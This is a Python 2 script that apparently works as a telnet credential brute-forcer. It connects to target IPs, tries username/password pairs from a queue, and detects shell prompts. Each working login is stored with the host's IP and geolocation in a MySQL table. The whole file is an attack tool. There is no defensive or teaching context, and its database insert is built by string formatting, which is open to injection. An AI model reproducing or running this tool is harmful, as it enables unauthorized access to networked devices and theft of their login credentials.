#!/usr/bin/env python
#encoding:utf-8

import pexpect
import MySQLdb
import IP

class Connection:
    def __init__(self, ip, auth_queue):
        self.new_state(conn_state)
        self.auth_queue = auth_queue
        self.ip = ip
        self.index = 0
        self.auth = None
        self.child = None

    def new_state(self, newstate):
        self._state = newstate

    def run(self):
        self._state._run(self)

    def exit(self):
        if self.child:
            self.child.close(force=True)

class conn_state:
    @staticmethod
    def _run(conn):
        try:
            log_file = open('telnet.log', 'a')
            conn.child = pexpect.spawn("telnet %s" % conn.ip)
            conn.child.logfile_send = log_file
            index = conn.child.expect(["(?i)username:", "(?i)enter:", "(?i)login:", "(?i)reject:", pexpect.TIMEOUT, pexpect.EOF], timeout = 30)
            if index < 4:
                #print "Got flag %s" % conn.ip
                conn.new_state(user_state)
            else:
                conn.new_state(None)
                if log_file:
                    log_file.close()
        except:
            conn.new_state(None)
            if log_file:
                log_file.close()

class user_state:
    @staticmethod
    def _run(conn):
        try:
            conn.auth = conn.auth_queue.pop()
        except:
            conn.new_state(None)
            return

        user = conn.auth[0]
        conn.child.sendline(user)
        index = conn.child.expect(["(?i)password:", "(?i)username:", "(?i)account:", "(?i)login:", pexpect.TIMEOUT, pexpect.EOF], timeout = 30)
        if index == 0:
            conn.new_state(passwd_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)

class passwd_state:
    @staticmethod
    def _run(conn):
        if conn.auth:
            passwd = conn.auth[1]
        else:
            conn.new_state(None)
            return
        conn.child.sendline(passwd)
        index = conn.child.expect([r"[#|->$~/]","(?i)username:","(?i)enter:","(?i)account:","(?i)login:","(?i)pssword:",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
        if index == 0:
            print "Got password %s:%s-%s" % (conn.ip,conn.auth[0],conn.auth[1])
            conn.new_state(confirm_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)

class confirm_state:
    @staticmethod
    def _run(conn):
        try:
            user,passwd = conn.auth
            if conn.auth == ("user", "password"):
                conn.new_state(None)
                return
            db = MySQLdb.connect("localhost","telnet","telnet","telnet_data",charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (conn.ip,23,user,passwd,IP.find(conn.ip)))
            db.commit()
            print "[report] One result import to database"
        except:
            db.rollback()
        conn.new_state(None)
        db.close()